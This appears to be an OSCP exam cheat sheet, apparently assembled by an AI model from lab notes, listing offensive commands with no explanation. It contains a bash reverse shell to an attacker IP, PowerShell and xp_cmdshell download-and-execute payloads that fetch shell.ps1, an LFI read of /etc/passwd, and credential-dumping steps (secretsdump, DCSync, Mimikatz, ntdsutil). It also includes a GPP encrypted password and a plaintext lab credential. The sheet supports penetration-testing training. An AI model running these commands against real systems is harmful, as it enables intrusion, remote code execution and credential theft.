# OSCP - Fast Commands (Zero fluff)

## Globals
KALI_IP=10.10.14.16
NC=nc

## Discovery
nmap -Pn -p- -T4 --min-rate=1000 TARGET
nmap -sC -sV -p22,80,443,139,445,3389,5985,5986 TARGET
masscan TARGET -p1-65535 --rate=1000
rustscan -a TARGET -b 2000 -u 5000 -- -sV -sC -p1-65535

## Web - quick
python3 -m http.server 80
curl -I http://TARGET
gobuster dir -u http://TARGET -w /usr/share/wordlists/dirb/common.txt -t 50 -x php,html,txt -k
feroxbuster -u http://TARGET -w /usr/share/seclists/Discovery/Web-Content/common.txt -t 50 -x php,txt,html -k
ffuf -u https://TARGET/FUZZ -w /usr/share/wordlists/dirb/big.txt -t 50 -k -mc 200,301,302,401,403 -fs 0

## Git / source recovery
git-dumper http://TARGET/ ./repo
python3 -c "import http.server, socketserver; socketserver.TCPServer(('',80),http.server.SimpleHTTPRequestHandler).serve_forever()"

## File read / LFI / RCE payloads
curl "http://TARGET/?file=../../../../etc/passwd"
bash -c 'bash -i >& /dev/tcp/'$KALI_IP'/4444 0>&1'
python3 -c 'import base64,sys;print(__import__("base64").b64decode(sys.stdin.read()))' <<<BASE64

## Reverse listeners
$NC -lvnp 4444
socat TCP-LISTEN:4444,reuseaddr,fork EXEC:/bin/bash,pty,stderr,setsid,sigint,sane

## SMB / Windows - quick
smbclient -L //TARGET -N
smbmap -H TARGET
crackmapexec smb TARGET -u users.txt -p passwords.txt

## Impacket (use impacket- over .py)
impacket-smbclient DOMAIN/USER:PASS@TARGET
impacket-psexec DOMAIN/USER:PASS@TARGET
impacket-wmiexec DOMAIN/USER:PASS@TARGET
impacket-secretsdump DOMAIN/USER:PASS@TARGET

## Kerberos / AD
impacket-GetUserSPNs -request -dc-ip DC_IP DOMAIN/USER:PASS
kerberoast -u USER -p PASS -d DOMAIN -dc-ip DC_IP
bloodhound-python -u USER -p PASS -d DOMAIN -c all --zip

## MSSQL / xp_cmdshell
impacket-mssqlclient DOMAIN/USER:PASS@TARGET
sqlcmd -S TARGET -U user -P pass -Q "EXEC xp_cmdshell 'powershell -c "IEX(New-Object Net.WebClient).DownloadString(\\"http://'$KALI_IP'/shell.ps1\\")"'"

## PrivEsc Linux (fast checks)
sudo -l
find / -perm -4000 -type f 2>/dev/null
ps aux | egrep "python|perl|ruby|bash|sh"
ss -tulpn
grep -R "password" /var/www 2>/dev/null
find / -writable -type f 2>/dev/null

## PrivEsc Windows (fast checks)
whoami /all
powershell -nop -w hidden -c "iex (New-Object Net.WebClient).DownloadString('http://10.10.14.16/p.ps1')"
Get-ChildItem -Path C:\ -Filter 'root.txt' -Recurse -ErrorAction SilentlyContinue
Get-LocalGroupMember -Group "Administrators"
schtasks /query /fo LIST /v

## AD privesc common vectors
Get-ADUser -Identity user -Properties *
Get-ADComputer -Filter * -Properties *
dsacls "DC=domain,DC=local" /S

## DCSync / ACL abuse
impacket-secretsdump -just-dc DOMAIN/USER:PASS@DC_IP
ntdsutil "ac i ntds" "ifm" "create full C:\temp"

## Useful commands seen in notes
gpp-decrypt CiDUq6tbrBL1m/js9DmZNIydXpsE69WB9JrhwYRW9xywOz1/0W5VCUz8tBPXUkk9y80n4vw74KeUWc2+BeOVDQ
impacket-mssqlclient mssql-svc:corporate568@MSSQL_IP -windows-auth
xp_cmdshell 'powershell -c "IEX(New-Object Net.WebClient).DownloadString(\"http://'$KALI_IP'/shell.ps1\")"'

## Quick post-exploit
Invoke-Mimikatz -Command "lsadump::dcsync /domain:DOMAIN /all"
Get-ADObject -Filter 'isDeleted -eq $true' -IncludeDeletedObjects

## Sources
[prompt.txt](prompt.txt)
[The List](The List)
[Linux/Builder/notes.txt](Linux/Builder/notes.txt)
[Linux/OpenAdmin/notes.txt](Linux/OpenAdmin/notes.txt)
[Windows/Querier/notes.txt](Windows/Querier/notes.txt)
[Windows/Cascade/notes.txt](Windows/Cascade/notes.txt)
[Active Directory/Monteverde/notes.txt](Active Directory/Monteverde/notes.txt)
[Linux/Help/notes.txt](Linux/Help/notes.txt)

## Files added (created by assistant)
- OSCP_ENUM_RUNBOOK.sh (script)
- OSCP_RUNBOOKS.md
- OSCP_REPORT_TEMPLATE.md
